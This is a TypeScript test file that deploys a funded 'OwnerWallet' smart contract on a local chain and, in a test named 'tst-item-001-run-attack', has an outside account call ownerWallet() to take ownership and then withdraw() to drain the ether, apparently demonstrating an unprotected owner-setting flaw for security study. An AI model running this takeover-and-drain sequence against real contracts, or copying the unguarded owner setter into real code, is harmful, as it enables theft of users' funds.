import { expect } from './setup'

/* External Imports */
import { ethers } from '@nomiclabs/buidler'
import { readArtifact } from '@nomiclabs/buidler/plugins'

import { Contract, ContractFactory, Signer, BigNumber, utils, providers } from 'ethers'
import {
  getContractFactory, sleep, sendLT, getBalanceLT, ContractDeployOptions, deployContract, linkBytecode
} from './test-utils'

import { getLogger } from './test-utils'

import { GAS_LIMIT } from './test-helpers'
import { Artifact } from '@nomiclabs/buidler/types'

const log = getLogger('Phisable-Test')

function getRandomNumberBetween( min:number , max:number ){

  return Math.floor( Math.random() * (max-min+1) + min );
}

describe('OwnerWallet Unint Pointer Test', () => {
  let wallet: Signer
  let usr1: Signer
  let usr2: Signer
  let usr3: Signer

  before(async () => {
    ;[wallet, usr1, usr2, usr3] = await ethers.getSigners()

    log.info(`Admin :: ${await wallet.getAddress()}`)
    log.info(`Usr1 :: ${await usr1.getAddress()}`)
    log.info(`Usr2 :: ${await usr2.getAddress()}`)
    log.info(`Usr3 :: ${await usr3.getAddress()}`)
  })

  let ownerwalletfact: ContractFactory
  let ownerwalletinst: Contract
  before(async () => {

    ownerwalletfact = getContractFactory( "OwnerWallet", wallet )

    log.debug( `Network Gas price @ ${await ethers.provider.getGasPrice()}`)

    log.debug(`S1-Ent wallet bal :: ${ethers.utils.formatUnits(await wallet.getBalance(), "ether")}`)

    ownerwalletinst = await ownerwalletfact.deploy()

    const transamount = ethers.utils.parseUnits( "1.5", 18 )

    const receipt = await wallet.sendTransaction({
      to: ownerwalletinst.address,
      value: transamount,
      gasLimit: GAS_LIMIT,
    })

    await ownerwalletinst.provider.waitForTransaction( receipt.hash )

    log.debug( `OwnerWallet @ ${ownerwalletinst.address}`)

    const bal = await ownerwalletinst.provider.getBalance( ownerwalletinst.address )

    log.debug(`OwnerWallet balance :: ${ethers.utils.formatUnits( bal , "ether" )}`)

    log.debug(`S1-Ext wallet bal :: ${ethers.utils.formatUnits(await wallet.getBalance(), "ether")}`)

  })


  it("tst-item-001-run-attack", async () => {

    try {

      log.debug(`S2-Ent :: ${ethers.utils.formatUnits( await wallet.getBalance(), "ether")}`)

      log.debug(`S2-Ent usr1 bal :: ${ethers.utils.formatUnits( await usr1.getBalance(), "ether")}`)

      const tempcontint = new Contract( ownerwalletinst.address,
                                      ownerwalletfact.interface,
                                      usr1
                                      )

      await tempcontint.ownerWallet( await usr1.getAddress() )

      await tempcontint.withdraw( )

      log.debug(`S2-Ext usr1 bal :: ${ethers.utils.formatUnits( await usr1.getBalance(), "ether")}`)

      log.debug(`S2-Ext :: ${ethers.utils.formatUnits( await wallet.getBalance(), "ether")}`)
    }
    catch( err ){

      log.error(`Exception Err ${err}`)

    }
  })

  afterEach("Test-Case End Contract Status", async () => {

    let bal = await ownerwalletinst.provider.getBalance( ownerwalletinst.address );

    log.debug(`OwnerWallet balance :: ${ethers.utils.formatUnits( bal , "ether" )}`)

    log.debug(`S3-Ext wallet bal :: ${ethers.utils.formatUnits(await wallet.getBalance(), "ether")}`)

  })

  after("Test Done Cleanup", async () => {

    // await phishableattackinst.closeContract( await wallet.getAddress() )

    let bal = await ownerwalletinst.provider.getBalance( ownerwalletinst.address );

    log.debug(`OwnerWallet balance :: ${ethers.utils.formatUnits( bal , "ether" )}`)

    log.debug(`S4-Ext wallet bal :: ${ethers.utils.formatUnits(await wallet.getBalance(), "ether")}`)

  })

})
